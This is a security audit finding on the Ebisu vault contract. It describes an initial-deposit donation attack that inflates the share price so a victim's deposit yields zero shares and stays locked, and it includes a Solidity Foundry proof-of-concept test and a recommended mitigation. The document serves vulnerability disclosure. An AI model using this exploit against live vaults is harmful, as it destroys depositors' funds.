---
# Core Classification
protocol: Ebisu
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 58117
audit_firm: Pashov Audit Group
contest_link: none
source_link: https://github.com/pashov/audits/blob/master/team/md/Ebisu-security-review.md
github_link: none

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Pashov Audit Group
---

## Vulnerability Title

[M-03] Initial griefing attack possible

### Overview


This bug report discusses a potential attack on a vault contract that could result in users losing their funds. The attack involves manipulating the conversion of assets to shares, which can cause strange behavior and lock users' tokens in the contract. While the likelihood of this attack is low, it can have a high impact on victims. The report recommends mitigating this issue by implementing an initial deposit of a small amount, which would make the attack too costly for the attacker to execute.

### Original Finding Content

## Severity

**Impact:** High, as the victim loses their funds

**Likelihood:** Low, as it comes at a cost for the attacker

## Description

The famous initial deposit attack is largely mitigated by the `+1` done in the asset/shares conversion. However, doing this attack can cause some strange behavior that could grief users (at high cost of the attacker) and leave the vault in a weird state:

Here's a PoC showing the impacts, can be added to `Deposit.t.sol`:

```solidity
    Vault vault;
    MockERC20 asset;

    address bob = makeAddr('bob');

    function setUp() public {
        asset = new MockERC20();
        vault = new Vault(100e18,100e18,asset);

        asset.mint(address(this), 10e18 + 9);
        asset.mint(bob,1e18);
    }

    function test_initialSupplyManipulation() public {
        // mint a small number of shares
        // (9 + 1 = 10) makes math simpler
        asset.approve(address(vault),9);
        vault.deposit(9, address(this));

        // do a large donation
        asset.transfer(address(vault), 10e18);

        // shares per assets is now manipulated
        assertEq(1e18+1,vault.convertToAssets(1));

        // victim stakes in vault
        vm.startPrank(bob);
        asset.approve(address(vault), 1e18);
        vault.deposit(1e18, bob);
        vm.stopPrank();

        // due to manipulation they receive 0 shares
        assertEq(0,vault.balanceOf(bob));

        // attacker redeems their shares
        vault.redeem(vault.balanceOf(address(this)), address(this), address(this));

        // even though the attacker loses 0.1 tokens
        assertEq(9.9e18 + 9,asset.balanceOf(address(this)));
        // the vicims tokens are lost and locked in the contract
        assertEq(1.1e18,asset.balanceOf(address(vault)));
    }
```

As you can see the attacker needs to pay `0.1e18` of assets for the attack. But they have effectively locked the victims `1e18` tokens in the contract.

Even though this is not profitable for the attacker it will leave the vault in a weird state and the victim will still have lost their tokens.

## Recommendations

Consider mitigating this with an initial deposit of a small amount. This is the most common and easy way to make sure this is not possible, as long as it is an substantial amount it will make this attack too costly.

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Pashov Audit Group |
| Protocol | Ebisu |
| Report Date | N/A |
| Finders | Pashov Audit Group |

### Source Links

- **Source**: https://github.com/pashov/audits/blob/master/team/md/Ebisu-security-review.md
- **GitHub**: N/A
- **Contest**: N/A

### Keywords for Search

`vulnerability`

